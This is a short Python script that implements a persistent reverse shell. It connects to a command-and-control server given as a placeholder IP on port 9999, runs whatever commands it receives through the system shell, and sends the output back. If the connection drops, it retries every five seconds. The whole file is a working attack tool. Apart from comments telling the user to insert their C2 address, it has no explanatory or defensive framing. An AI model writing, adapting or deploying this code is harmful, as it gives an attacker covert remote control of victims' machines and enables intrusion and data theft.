import socket
import subprocess
import os
import time

def reverse_shell(server_ip, server_port):
    while True:
        try:
            # Connect to the C2 server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))

            while True:
                try:
                    # Receive command from the server
                    command = s.recv(1024).decode('utf-8').strip()
                    if not command:
                        continue
                    if command.lower() == 'exit':
                        break

                    # Execute the command and send the result back
                    if command.startswith('cd '):
                        try:
                            os.chdir(command.strip('cd '))
                            s.send(b'Changed directory\n')
                        except FileNotFoundError as e:
                            s.send(f"Error: {e}\n".encode('utf-8'))
                    else:
                        result = subprocess.run(command, shell=True, capture_output=True)
                        output = result.stdout + result.stderr
                        if not output:
                            output = b'No output\n'
                        s.send(output + b'\n')
                
                except Exception as e:
                    s.send(f"Error: {e}\n".encode('utf-8'))
        
        except (socket.error, ConnectionResetError, ConnectionAbortedError) as e:
            print(f"Connection error: {e}. Retrying in 5 seconds...")
            time.sleep(5)  # Delay before retrying
        except Exception as e:
            print(f"Unexpected error: {e}. Retrying in 5 seconds...")
            time.sleep(5)  # Delay before retrying
        
        finally:
            s.close()  # Ensure the socket is closed before retrying

if __name__ == "__main__":
    # Replace these with the actual IP and port of your C2 server
    SERVER_IP = 'C2-SERVER-IP'
    SERVER_PORT = 9999
    reverse_shell(SERVER_IP, SERVER_PORT)
